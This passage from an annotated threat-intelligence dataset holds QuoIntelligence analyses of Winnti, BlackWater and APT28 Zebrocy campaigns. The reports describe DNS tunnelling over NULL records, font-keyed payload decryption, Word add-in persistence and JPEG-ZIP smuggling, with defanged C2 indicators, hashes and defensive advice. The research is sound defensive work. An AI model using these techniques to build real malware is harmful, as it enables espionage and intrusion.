[observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings.\nThe implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section.\n**Use of Iodine for C2 DNS Tunneling**\nThe iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions:\n*![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)*\n*Table 3 \u2013 Malware DLL Functions*\nFor instance, the 64bit executable contains the build\\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3):\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png)\n*Code 2- iodine\\_0-6-0\\_build\\_hostname*\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png)\n*Code 3- iodine\\_0-6-0\\_build\\_hostname*\nBased on the presence of the functions base128\\_blksize\\_enc and base128\\_blksize\\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions.\nFurther, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries.\nThis indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable.\nThe DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png)\n*Figure 4 \u2013 C2 channel over DNS*\n1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com).\nNotably, NULL and TXT DNS request types are iodine\u2019s preferred channels since they are \u201c[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)\u201d.\nIt is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research.\n2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server.\nAt this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained.\nTo note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server.\n3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host.\nNotably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level.\n**The NULL DNS record type**\nThe implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware:\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png)\nThe third argument when calling dns\\_encode shall be of the type \u201cstruct query\u201d\nfrom Iodine\u2019s\u00a0[dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232)\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png)\nAccording to\u00a0[common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), \u201cstruct query\u201d is defined as:\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png)\nSince QUERY\\_NAME\\_SIZE equals to 512\u00a0 (4 *128 \u2013 integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type.\nAs noted, reversing activity detailed the query[128] value to be 0xa.\nFrom Iodine\u2019s\u00a0[windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\\_NULL is DNS\\_TYPE\\_NULL\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png)\nFinally, from\u00a0[Windows\u2019s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants),\u00a0DNS\\_TYPE\\_NULL is actually a Windows constant equal to 0xa\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png)\n### Winnti Signed Code With Digital Certificate from IQ Technology\nDuring our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software.\nThe rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company.\nAlthough the report is no longer online,\u00a0 the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate.\nAt the time of analysis, the digital certificate was already revoked.\nThe sample\u2019s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version.\nAdditionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* \u00a0\nBoth samples are highly related, and its contents combined with the date of \u00a0analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe.\n### Sample Targeting South Korean Gaming Company\n| **HASHES** | **Compilation Timestamp** |\n| **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4\n**SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d\n**SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 |\n*Table 3 \u2013 observed network IoCs in Winnti sample*\nOn 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service.\nAs multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner.\n**Binary Analysis**\nThe sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload:\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png)\nUnfortunately we were not able to find the payload meant to be decrypted by this dropper.\nHowever, we were able to extract the malware\u2019s configuration file and identify the intended target.\nIn this case, the following string was included within the extracted configuration:\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png)\nBased on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company.\nThe company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application.\nAs we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan.\nInterestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png)\n*Excerpt from ESET Research White paper \u201c*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*\u201d*\nAt this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting.\n### Conclusion\nThe Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits.\nWhile attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources.\nThe detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group\u2019s interest in German DAX companies.\nAs a result, organizations of all sizes, but especially small to medium sized companies, including Germany\u2019s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets.\nGovernment oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks.\nAppendix\n--------\n### Indicators of Compromise\n4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9\ncf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986\n1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2\n8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf\nbfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860\ndf6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c\n4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9\ncf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986\n1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2\n8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf\nbfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860\ndf6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c\n*.dick[.]mooo[.]com\n208[.]67[.]222[.]222\n45[.]248[.]85[.]200\n### MITRE ATT&CK\n| **Tactic** | **Technique** | **Recommended Course of Action** |\n| Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions\n[T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques.\n|\n| Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding\n[T1014](https://attack.mitre.org/techniques/T1014/) Rootkit\n[T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate.\nEnforce signature validation via Group Policies for executables |\n| Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted\n[T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | \u2013 For DNS Tunnel, ensure that DNS logs are collected and reviewed.\n\u2013 DNS telemetic data should be also collected in order to spot frequent and \u00a0heavy loaded DNS communication that are definitely not related to an usual DNS query.\n\u2013 FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required\n\u2013 DNS NULL type queries should not be avoided.\nOnly the required record types should be allowed.\n|\n* [Follow](https://twitter.com/QuoIntelligence \"Follow on Twitter\")[Follow](https://twitter.com/QuoIntelligence \"Twitter\")\n* [Follow](https://www.linkedin.com/company/quointelligence/ \"Follow on LinkedIn\")[Follow](https://www.linkedin.com/company/quointelligence/ \"LinkedIn\")\nJoin Our Newsletter.\n--------------------\nSubscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates.\nOnly valid business emails will be approved.\nPlease enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy).\nGDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry.\nMessageSubscribe", "mitre_ids": ["G0044", "T1071", "G0044", "G0044", "TA0011", "G0044", "T1071", "T1218", "G0044", "G0044", "G0096", "G0044", "G0044", "G0044", "G0044", "T1588", "G0044", "G0044", "G0044", "G0044", "G0044", "G0044", "G0044", "G0044", "G0096", "G0044", "G0044", "G0025", "G0004", "G0044", "G0096", "T1190", "S0154", "G0044", "G0044", "G0044", "T1553", "T1553", "T1553", "T1553", "G0010", "G0044", "T1014", "T1014", "T1014", "TA0011", "T1071", "G0044", "TA0011", "T1071", "G0044", "S0013", "TA0011", "T1071", "G0044", "T1071", "G0050", "TA0011", "G0044", "TA0011", "T1071", "T1071", "T1620", "G0044", "T1071", "TA0011", "T1071", "T1071", "T1071", "TA0002", "TA0011", "T1071", "T1071", "T1071", "G0044", "T1588", "G0044", "G0044", "T1588", "T1014", "G0044", "T1014", "G0044", "G0044", "G0044", "G0044", "T1105", "T1105", "G0044", "G0044", "G0044", "TA0011", "G0044", "TA0011", "TA0011", "G0044", "T1105", "G0044", "G0044", "G0044", "G0044", "T1068", "T1014", "T1560", "T1048"], "anno_name_label": [["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Meterpreter"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TOOL", "Iodine"], ["TECHNIQUE", "Command and Scripting Interpreter: Unix Shell"], ["TECHNIQUE", "Kernel Modules and Extensions"], ["TECHNIQUE", "Binary Padding"], ["TECHNIQUE", "Code Signing"]], "cti_entity_class": ["CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "BlackWater Malware Leveraging Beirut Tragedy in New Targeted Campaign\nAug 7, 2020\n### **[Updated on August 11, 2020]**\nExecutive Summary\n-----------------\n* [QuoIntelligence](https://quointelligence.eu/) discovered a new targeted campaign delivering the novel BlackWater malware\n* The campaign used the Beirut incident to lure the targets, with an attempt to spoof an official OSCE report\n* The campaign was launched on 5 August, only one day after the Beirut incident.\nThe provider hosting the attack infrastructure promptly shot down the C2 servers after our notification on 7 August\n* The attack used state-of-the-art techniques, such as DNS over HTTPs (DoH)\n* Based on the advanced TTPs and the discovered targets, we classify the threat actor as an Advanced Persistent Threat (APT) group named \u201cReconHellcat\u201d\n* Observed ReconHellcat targets consist of -at least- defense and diplomatic government bodies in Bulgaria and Azerbaijan\nIntroduction\n------------\nOn 6\u00a0August,\u00a0QuoIntelligence discovered a malicious file uploaded to VirusTotal using the Beirut incident as a theme to lure the targets.\nFurther analysis attributed the analysed artifact to BlackWater: [a recently-discovered](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/) malware that uses\u00a0[Cloudflare Workers](https://blog.cloudflare.com/cloudflare-workers-unleashed/) as a C2 communication interface and DNS over HTTPS (DoH) as name resolution channel.\nWe publicly disclosed our preliminary results on 7 August and made Cloudflare aware of the malicious infrastructure.\nCloudflare promptly shutdown the C2 servers after our notification.\nTechnical Analysis\n------------------\nOn 5 August, a compressed archive was uploaded to [VirusTotal](https://www.virustotal.com/gui/file/b4ed39b6852bce329686ec44e2e8e39b1c0be9b7095cec2e1682e6e2ef724c69) from Azerbaijan, containing a malicious, macro-enabled Word Document (maldoc) themed for the recent explosion in Beirut.\nThe name of the maldoc (*047-20 \u2013 OSCE Report Beirut explosion.doc*) might indicate attackers\u2019 intent to spoof the [Organization for Security and Co-operation in Europe](https://www.osce.org/) (OSCE), however, we discovered that attackers weaponized a legit Word document available in the web portal of the [Organismo Supervisor de las Contrataciones del Estado](https://www.gob.pe/en/osce) (OSCE), which is a supervisory body of the Peruvian Ministry of Economy.\nThe image below shows the comparison between the maldoc and the legit Word file from the Peruvian OCSE available in their website.\n![Blackwater](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![Blackwater](https://quointelligence.eu/wp-content/uploads/2020/08/maldoc_vs_legit-1024x433.png)\nThe maldoc contains an obfuscated macro that retrieves the second-stage encrypted payload from one of the three hardcoded C2 URLs depending on the user\u2019s Windows version.\nTo decrypt the payload, attackers implemented the old-fashion substitution cipher technique *[Book cipher](https://en.wikipedia.org/wiki/Book_cipher)*using the legit Windows file\u00a0`C:\\Windows\\Fonts\\cambriab.tff` as key.\nTo note that the content of this file differs depending on the Windows version , this is why the malicious macro checks the Windows version at the beginning of its execution, and contacts a specific URL depending of the result of this check.\nFinally, the decrypted payload is written\u00a0in\u00a0`%APPDATA%\\\\Microsoft\\Word\\STARTUP\\Moon.wll`\u00a0.\nBy\u00a0storing a Word add-in in such path allows Microsoft Word to load and execute it a malicious payload whenever it is launched.\nAlthough this technique ([T1137/006](https://attack.mitre.org/techniques/T1137/006/)) was firstly documented by F-Secure in 2017,\u00a0only this year researchers publicly reported two APT groups firstly using it: [Naikon APT](https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/) and [Vicious Panda](https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/).\nThe malicious\u00a0`Moon.wll`contains another encrypted set of three different C2 URLs, and once executed by Word, it downloads an encrypted x64 executable as the final backdoor.\nThe decryption technique used to decrypt the x64 backdoor still uses the Windows font file as key, however, the C2 URL is passed as an encrypted parameter which is decrypted via a different substitution cipher relying on an hardcoded alphabet as a key.\nFinally, the Blackwater backdoor starts communicating with the Clouldflare Worker via JSON.\nNotably, both the loader and the backdoor resolve the C2 hostnames via DNS-over-HTTP (DoH) by using a built-in feature of libcurl.\nOnly the malicious Macro is using the system\u2019s default DNS server to get the first-stage payload.\nTo note that all the samples we have analysed had a very low AV detection rate when they were firstly uploaded to VirusTotal.\nThe C2 infrastructure was hosted on Cloudflare Workers platform, which is a service enabling users to register a subdomain and then have serverless code running to handle requests.\nAttribution\n-----------\nOur technical findings overlap with the Tactics, Techniques and Procedures (TTPs) previously attributed to the BlackWater malware campaign first identified in March:\n* Compressed archive containing a maldoc\n* Blackwater strings within the malware\n* DoH communications using\u00a0`cloudflare-dns.com`\n* C2 hosted on Cloudflare Workers service\n* JSON encoded communications\nAs shown in the picture below, the analysis of the x64 sample revealed multiple strings containing the word \u201cBlackWater\u201d.\n![Blackwaters](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![Blackwaters](https://quointelligence.eu/wp-content/uploads/2020/08/code_snippet-1024x405.png)\nWe researched the targets of both BlackWater campaigns (March and August) and concluded that -at least- defense and diplomatic government bodies in Bulgaria and Azerbaijan were highly likely targeted.\nBased on the advanced TTPs and the targeted institutions we classify the threat actor as an Advanced Persistent Threat (APT) group.\nSince we have not found yet any solid overlap with any already-known APT group, we are naming the attackers behind the two BlackWater campaigns as \u201cReconHellcat\u201d.\nDo you want to stay\u00a0informed of cyber and geopolitical threats targeting *your* organization.\nAre you interested in receiving exclusive and unpublished intelligence.\n[Get in touch!](https://quointelligence.eu/#contact)\nAppendix I\n----------\nEarly Indicators of Compromise\n------------------------------\n**047-20 \u2013 OSCE Report Beirut explosion.rar** b4ed39b6852bce329686ec44e2e8e39b1c0be9b7095cec2e1682e6e2ef724c69\u00a0\n**047-20 \u2013 OSCE Report Beirut explosion.doc** 8b5ae22661e690b6689ea5894cb05e288c64927c2f0ccf8c11c814ad56968376\n**Second Stage \u2013 Office Plugin \u2013\u00a0moon1.wll**\n9b35a2bddc006ff5ab7262f5fb15f8c7ab9aee8f34bf02815f81f0c74222438b\n**Third-stage x64**(decrypted)\nf984bc0896813553ec8b6dbb9b72769b3bbc8fbbe401566049df2e2061f1a829\u00a0\u00a0\nhttps://b1[.]earth09[.]workers[.]dev/\u00a0\nhttps://b2[.]earth09[.]workers[.]dev/\u00a0\nhttps://b3[.]earth09[.]workers[.]dev/\u00a0\nhttps://moon3[.]earth09[.]workers[.]dev\u00a0\nhttps://moon1[.]earth09[.]workers[.]dev\u00a0\nhttps://moon2[.]earth09[.]workers[.]dev\u00a0\n* [Follow](https://twitter.com/QuoIntelligence \"Follow on Twitter\")[Follow](https://twitter.com/QuoIntelligence \"Twitter\")\n* [Follow](https://www.linkedin.com/company/quointelligence/ \"Follow on LinkedIn\")[Follow](https://www.linkedin.com/company/quointelligence/ \"LinkedIn\")", "mitre_ids": ["TA0011", "T1071", "TA0011", "T1071", "TA0011", "T1566", "T1566", "TA0011", "T1059", "T1105", "T1082", "T1140", "T1059", "T1082", "TA0011", "T1137", "T1137", "T1137", "G0019", "TA0011", "T1137", "T1027", "TA0011", "T1059", "T1105", "TA0011", "T1140", "T1140", "T1071", "TA0011", "T1071", "T1059", "T1105", "TA0011", "T1566", "TA0011", "TA0011"], "anno_name_label": [["MALWARE", "BlackWater"], ["MALWARE", "BlackWater"], ["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackWater"], ["GROUP", "vicious-panda"], ["MALWARE", "BlackWater"], ["TOOL", "libcurl"], ["MALWARE", "BlackWater"], ["MALWARE", "BlackWater"], ["MALWARE", "BlackWater"], ["MALWARE", "BlackWater"], ["GROUP", "ReconHellcat"]], "cti_entity_class": ["CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "APT28 Delivers Zebrocy Malware Campaign using NATO Theme as Lure\nSep 22, 2020\n**Executive Summary**\n---------------------\n* On 9 August,\u00a0[QuoIntelligence](https://quointelligence.eu/) detected an ongoing APT28 campaign, which likely started on 5 August.\n* The malware used in the attack was the Zebrocy Delphi version.\nAll the artifacts had very low Anti-Virus (AV) detection rates on VirusTotal when they were first submitted.\n* At the time of the discovery, the C2 infrastructure hosted in France was still live.\n* The campaign used NATO\u2019s upcoming trainings as a lure.\n* The campaign targeted a specific government body in Azerbaijan, however; it is likely that attackers also targeted NATO members or other countries involved in NATO exercises.\n* Analysis revealed interesting correlations with ReconHell/BlackWater attack, which we [uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August.\n* As part of our responsible disclosure, we reported our findings to French authorities for taking down the C2, and to NATO for their awareness.\n**Introduction**\n----------------\nOn 9 August, QuoIntelligence disseminated a Warning to its government customers about a new APT28 (*aka* Sofacy, Sednit, Fancy Bear, STRONTIUM, etc.\ncampaign targeting government bodies of [NATO](https://www.nato.int/) members (or countries cooperating with NATO).\nIn particular, we found a malicious file uploaded to VirusTotal, which ultimately drops a Zebrocy malware and communicates with a C2 in France.\nAfter our discovery, we reported the malicious C2 to the French law enforcement as part of our responsible disclosure process.\nZebrocy is a malware used by APT28 (also known as Sofacy), which was reported by multiple security firms[[1]](#_ftn1)[[2]](#_ftn2)[[3]](#_ftn3)[[4]](#_ftn4)[[5]](#_ftn5)[[6]](#_ftn6) in the last two years.\nFinally, our investigation concluded that the attack started on 5 August and targeted at least a government entity located in the Middle East.\nHowever, it is highly likely that NATO members also observed the same attack.\nTechnical Analysis\n------------------\n| **File Name** | Course 5 \u2013 16 October 2020.zipx |\n| **SHA256** | e6e19633ba4572b49b47525b5a873132dfeb432f075fbba29831f1bc59d5885d |\n| **First Submission to VT** | 2020-08-05T12:28:27 |\n| **First AV detetction rate** | Really Low (3/61) |\nAt a first look, the sample seems to be a valid JPEG image file:\u00a0\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"file_type\")\n![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet1.png \"file_type\")\nIn fact, if the file is renamed as a JPG, the Operating System will show the logo of the Supreme Headquarters Allied Powers Europe ([SHAPE](https://shape.nato.int/)), which is the NATO\u2019s Allied Command Operations (ACO) located in Belgium.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"courses_zipx\")\n![](https://quointelligence.eu/wp-content/uploads/2020/09/courses_zipx.png \"courses_zipx\")\nHowever, further analysis revealed the sample as having a Zip file concatenated.\nThis technique works because JPEG files are parsed from the beginning of the file and some Zip implementations parse Zip files from the end of the file (since the index is located there) without looking at the signature in the front.\nThe technique is also used by threat actors to evade AVs, or other filtering systems since they might mistake the file for a JPEG and skip it.\nInterestingly, in order to trigger the decompression of the file on Windows after the user clicks on it, the following conditions need to be met: \u00a0a) the file must be correctly named .zip(x); b) the file needs to be opened with WinRAR. The file will show an error message\u00a0claiming it is corrupted if the targeted victim uses WinZip or the default Windows utility.\nAfter decompressing the appended ZIP file, the following two samples are dropped:\n* Course 5 \u2013 16 October 2020.exe (Zebrocy malware)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 SHA256:\u00a0 aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec\n* Course 5 \u2013 16 October 2020.xls (Corrupted file)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0SHA256: b45dc885949d29cba06595305923a0ed8969774dae995f0ce5b947b5ab5fe185\nConsidering the lure uses a NATO image, the attackers likely picked the filenames in order to leverage upcoming [NATO courses](https://www.natoschool.nato.int/Academics/Portfolio/Course-Catalogue#2aid-aid) in October 2020.\nAdditionally, the Excel file (XLS) is corrupted and cannot be opened by Microsoft Excel, it contains \u2013 what seems to be \u2013 information about military personnel involved in the military mission \u201cAfrican Union Mission for Somalia\u201d.\nThe long list of information includes names, ranks, unit, arrival/leave dates, and more.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"African_Union_Mission_for_Somalia\")![](https://quointelligence.eu/wp-content/uploads/2020/09/African_Union_Mission_for_Somalia.png \"African_Union_Mission_for_Somalia\")\nTo note, QuoIntelligence was not able to determine if the information contained in the file is legitimate or not.\nOne of the hypotheses explaining the corrupted file is an intentional tactic of the attacker.\nThe rationale could be that the attacker makes the user attempt to first open the XLS file, and then open the .exe with the same filename as a second try.\nThe .exe file has a PDF icon, so if file extensions are not shown, targeted users might be lured into opening the executable.\n| **File Name** | Course 5 \u2013 16 October 2020.exe |\n| **SHA256** | aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec |\n| **First Submission to VT** | 2020-08-05T18:33:39 |\n| **First AV detection rate** | Really Low (9/70) |\nThe sample analyzed is a Delphi executable.\nSince 2015, [multiple](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [researchers](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/) have already covered Zebrocy Delphi versions in-depth.\nInterestingly, last Zebrocy [observations](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/) seemed to suggest a discontinuity of the Delphi versions in favor of a new one written in [Go language](https://securelist.com/a-zebrocy-go-downloader/89419/).\nBehavior Analysis\n-----------------\nOnce executed, the sample copies itself into %AppData%\\Roaming\\Service\\12345678\\sqlservice.exe\u00a0by adding 160 random bytes to the new file.\nThis padding is used to evade hash-matching security controls, since the dropped malware will always have a different file hash value.\nNext, the malware creates a new scheduled task, and it is executed with the /s\u00a0parameter\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"code_snippet1\")\n![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet2.png \"code_snippet1\")\nThe task runs regularly and tries 